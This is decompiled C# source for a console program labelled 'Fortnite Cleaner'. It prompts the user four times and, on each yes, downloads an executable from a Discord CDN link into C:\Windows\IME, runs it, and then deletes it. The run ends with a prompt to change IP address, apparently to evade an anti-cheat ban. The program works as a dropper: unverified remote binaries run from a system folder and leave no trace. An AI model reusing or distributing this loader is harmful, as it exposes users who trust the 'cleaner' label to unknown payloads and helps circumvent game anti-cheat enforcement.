using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

internal static class Class0
{
	[STAThread]
	private static void Main()
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0050: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Invalid comparison between Unknown and I4
		//IL_00da: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Invalid comparison between Unknown and I4
		//IL_0174: Unknown result type (might be due to invalid IL or missing references)
		//IL_017a: Invalid comparison between Unknown and I4
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0202: Invalid comparison between Unknown and I4
		Thread.Sleep(2000);
		Console.Title = "Fortnite Cleaner";
		Console.ForegroundColor = ConsoleColor.Cyan;
		Console.WriteLine("");
		Console.WriteLine("  Please wait...");
		Thread.Sleep(3000);
		Console.Clear();
		DialogResult val = MessageBox.Show("Run AdvancedEventCleaner.exe?", "Cleaner", (MessageBoxButtons)4, (MessageBoxIcon)32);
		if ((int)val == 6)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\AdvancedEventCleaner.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/778605318677856266/778897224700657664/AdvancedEventCleaner.exe", text);
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo("C:\\Windows\\\\IME\\AdvancedEventCleaner.exe", "-n")
			{
				UseShellExecute = false
			};
			process.Start();
			process.WaitForExit();
			File.Delete(text);
			Console.Clear();
		}
		Console.Clear();
		Console.Title = "Fortnite Cleaner";
		Console.ForegroundColor = ConsoleColor.Cyan;
		Console.WriteLine("");
		Console.WriteLine("  Please wait...");
		if ((int)MessageBox.Show("Run 1buttonCLEANERv6dot2.exe?", "Cleaner", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
		{
			WebClient webClient2 = new WebClient();
			string text2 = "C:\\Windows\\IME\\1buttonCLEANERv6dot2.exe";
			webClient2.DownloadFile("https://cdn.discordapp.com/attachments/778605318677856266/778897274163429386/1buttonCLEANERv6dot2.exe", text2);
			Process obj = new Process
			{
				StartInfo = new ProcessStartInfo("C:\\Windows\\\\IME\\1buttonCLEANERv6dot2.exe", "-n")
				{
					UseShellExecute = false
				}
			};
			Console.Clear();
			obj.Start();
			obj.WaitForExit();
			File.Delete(text2);
			Console.BackgroundColor = ConsoleColor.Black;
			Console.Clear();
		}
		Console.Clear();
		Console.Title = "Fortnite Cleaner";
		Console.ForegroundColor = ConsoleColor.Cyan;
		Console.WriteLine("");
		Console.WriteLine("  Please wait...");
		if ((int)MessageBox.Show("Run Oldapplecleaner.exe?", "Cleaner", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
		{
			WebClient webClient3 = new WebClient();
			string text3 = "C:\\Windows\\IME\\Oldapplecleaner.exe";
			webClient3.DownloadFile("https://cdn.discordapp.com/attachments/778605318677856266/778897305658982420/applecleaner.exe", text3);
			Process process2 = new Process();
			process2.StartInfo = new ProcessStartInfo("C:\\Windows\\\\IME\\Oldapplecleaner.exe", "-n");
			process2.Start();
			process2.WaitForExit();
			File.Delete(text3);
			Console.Clear();
		}
		Console.Clear();
		Console.Title = "Fortnite Cleaner";
		Console.ForegroundColor = ConsoleColor.Cyan;
		Console.WriteLine("");
		Console.WriteLine("  Please wait...");
		if ((int)MessageBox.Show("Run Newapplecleaner.exe?", "Cleaner", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
		{
			WebClient webClient4 = new WebClient();
			string text4 = "C:\\Windows\\IME\\Newapplecleaner.exe";
			webClient4.DownloadFile("https://cdn.discordapp.com/attachments/778605318677856266/778897379843768340/cleaner_protected.exe", text4);
			Process process3 = new Process();
			process3.StartInfo = new ProcessStartInfo("C:\\Windows\\\\IME\\Newapplecleaner.exe", "-n");
			process3.Start();
			process3.WaitForExit();
			File.Delete(text4);
			Console.Clear();
			Console.Title = "Fortnite Cleaner";
			Console.ForegroundColor = ConsoleColor.Cyan;
			Console.WriteLine("");
			Console.WriteLine("  Cleaned!");
			Console.WriteLine("  Please Change IP Address!");
			Thread.Sleep(7000);
			Process.GetCurrentProcess().Kill();
		}
		else
		{
			Console.Clear();
			Console.Title = "Fortnite Cleaner";
			Console.ForegroundColor = ConsoleColor.Cyan;
			Console.WriteLine("");
			Console.WriteLine("  Cleaned!");
			Console.WriteLine("  Please Change IP Address!");
			Thread.Sleep(7000);
			Process.GetCurrentProcess().Kill();
		}
	}
}
